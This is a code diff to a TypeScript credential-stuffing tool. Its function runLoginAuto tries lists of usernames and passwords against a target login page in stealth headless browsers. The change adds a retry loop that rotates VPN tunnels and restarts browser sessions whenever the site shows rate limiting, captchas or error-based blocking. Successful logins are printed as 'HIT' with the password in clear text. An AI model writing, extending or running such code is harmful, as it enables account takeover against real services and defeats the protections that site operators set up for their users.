@@ -359,6 +359,8 @@ export async function runLoginAuto(
   let succeeded = 0;
   const hits: LoginAttempt[] = [];
 
+  const MAX_VISIBLE_ERROR_RETRIES = 3;
+
   // ── Loop through creds ──────────────────────────────────────────────────────
   for (let i = 0; i < creds.length; i++) {
     const { username, password } = creds[i];
@@ -372,25 +374,9 @@ export async function runLoginAuto(
       }
     }
 
-    const vpnName = activeVpn?.name ?? 'none';
+    let vpnName = activeVpn?.name ?? 'none';
     console.log(`\n[auto] [${i + 1}/${creds.length}] ${username} | vpn: ${vpnName}`);
 
-    const browser = await chromium.launch({
-      headless: true,
-      args: STEALTH_LAUNCH_ARGS,
-      ignoreHTTPSErrors: true as any,
-    } as any);
-
-    // No proxy needed — traffic routes through the WireGuard VPN interface directly
-    const context = await browser.newContext({
-      ...getStealthContextOptions(),
-      ignoreHTTPSErrors: true as any,
-    } as any);
-
-    const page = await context.newPage();
-    await injectDeepStealth(page, `login-${username}-${Date.now()}`);
-
-    const t0 = Date.now();
     let attempt: LoginAttempt = {
       url:        targetUrl,
       username,
@@ -403,43 +389,85 @@ export async function runLoginAuto(
       durationMs: 0,
     };
 
-    try {
-      const outcome = await attemptLogin(page, targetUrl, selectors, username, password);
-      
-      attempt.success    = outcome.outcome === 'success' || outcome.outcome === '2fa_required';
-      attempt.outcome    = outcome.outcome;
-      attempt.accountExists = outcome.accountExists;
-      attempt.reason     = outcome.message || outcome.outcome;
-      attempt.durationMs = Date.now() - t0;
+    // Retry loop: if we get "visible error selector triggered", rotate VPN and retry
+    // with a fresh browser session (up to MAX_VISIBLE_ERROR_RETRIES times)
+    for (let retryNum = 0; retryNum <= MAX_VISIBLE_ERROR_RETRIES; retryNum++) {
 
-      // Ensure screenshot is taken for ALL attempts to record exact state
-      await page.screenshot({ path: `./attempt_${outcome.outcome}_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true }).catch(() => {});
+      const browser = await chromium.launch({
+        headless: true,
+        args: STEALTH_LAUNCH_ARGS,
+        ignoreHTTPSErrors: true as any,
+      } as any);
 
-      if (attempt.success) {
-        console.log(`[auto] ✓ HIT: ${username}:${password} (${attempt.reason})`);
-        if (activeVpn) vpnSuccess(activeVpn);
-        succeeded++;
-        hits.push(attempt);
-      } else {
-        console.log(`[auto] ✗ miss: ${username} (${attempt.reason})`);
-        
-        if (outcome.outcome === 'rate_limited' || outcome.outcome === 'captcha_block') {
+      const context = await browser.newContext({
+        ...getStealthContextOptions(),
+        ignoreHTTPSErrors: true as any,
+      } as any);
+
+      const page = await context.newPage();
+      await injectDeepStealth(page, `login-${username}-${Date.now()}-r${retryNum}`);
+
+      const t0 = Date.now();
+      attempt.timestamp = new Date().toISOString();
+      attempt.tunnel = activeVpn?.name ?? 'none';
+
+      let shouldRetry = false;
+
+      try {
+        const outcome = await attemptLogin(page, targetUrl, selectors, username, password);
+
+        attempt.success       = outcome.outcome === 'success' || outcome.outcome === '2fa_required';
+        attempt.outcome       = outcome.outcome;
+        attempt.accountExists = outcome.accountExists;
+        attempt.reason        = outcome.message || outcome.outcome;
+        attempt.durationMs    = Date.now() - t0;
+
+        await page.screenshot({ path: `./attempt_${outcome.outcome}_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true }).catch(() => {});
+
+        if (attempt.success) {
+          console.log(`[auto] ✓ HIT: ${username}:${password} (${attempt.reason})`);
+          if (activeVpn) vpnSuccess(activeVpn);
+          succeeded++;
+          hits.push(attempt);
+        } else if (outcome.outcome === 'rate_limited' || outcome.outcome === 'captcha_block') {
           console.warn(`[auto] Blocked by ${outcome.outcome} on ${vpnName} — rotating VPN...`);
           if (activeVpn) vpnFail(activeVpn);
           activeVpn = rotate();
+          vpnName = activeVpn?.name ?? 'none';
+          shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
+        } else if ((outcome.message || '').includes('visible error selector triggered') && retryNum < MAX_VISIBLE_ERROR_RETRIES) {
+          // Visible error selector = likely IP/detection block, not wrong creds
+          console.warn(`[auto] Visible error selector on ${vpnName} — rotating VPN and retrying ${username} (retry ${retryNum + 1}/${MAX_VISIBLE_ERROR_RETRIES})...`);
+          if (activeVpn) vpnFail(activeVpn);
+          activeVpn = rotate();
+          vpnName = activeVpn?.name ?? 'none';
+          shouldRetry = true;
+        } else {
+          console.log(`[auto] ✗ miss: ${username} (${attempt.reason})`);
+        }
+
+      } catch (err: any) {
+        console.error(`[auto] error on ${username}: ${err.message?.split('\n')[0]}`);
+        attempt.reason     = err.message?.split('\n')[0] ?? 'unknown_error';
+        attempt.durationMs = Date.now() - t0;
+
+        if (activeVpn) vpnFail(activeVpn);
+        if (isBlockError(err.message ?? '')) {
+          console.warn(`[auto] Block/connection error on ${vpnName} — rotating VPN now.`);
+          activeVpn = rotate();
+          vpnName = activeVpn?.name ?? 'none';
+          shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
         }
       }
 
-    } catch (err: any) {
-      console.error(`[auto] error on ${username}: ${err.message?.split('\n')[0]}`);
-      attempt.reason     = err.message?.split('\n')[0] ?? 'unknown_error';
-      attempt.durationMs = Date.now() - t0;
+      await browser.close();
 
-      if (activeVpn) vpnFail(activeVpn);
-      if (isBlockError(err.message ?? '')) {
-        console.warn(`[auto] Block/connection error on ${vpnName} — rotating VPN now.`);
-        activeVpn = rotate();
-      }
+      if (!shouldRetry) break;
+
+      // Wait before retry with new VPN
+      const retryDelay = randDelay(3000, 6000);
+      console.log(`[auto] Waiting ${(retryDelay / 1000).toFixed(1)}s before retry...`);
+      await new Promise(r => setTimeout(r, retryDelay));
     }
 
     appendResult(attempt);
@@ -477,7 +505,6 @@ export async function runLoginAuto(
       console.error(`[auto] Failed to sort/remove credential:`, e);
     }
 
-    await browser.close();
     attempted++;
 
     if (stopOnSuccess && succeeded > 0) {
